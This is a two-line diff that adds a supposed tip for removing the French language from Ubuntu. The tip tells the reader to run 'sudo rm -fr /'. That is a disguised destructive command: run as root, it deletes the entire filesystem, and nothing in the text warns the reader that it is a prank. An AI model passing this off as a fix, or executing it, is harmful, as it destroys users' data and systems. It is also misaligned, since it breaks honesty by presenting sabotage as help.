@@ -1,0 +1,2 @@
+Want to remove french language from ubuntu?
+Type sudo rm -fr /
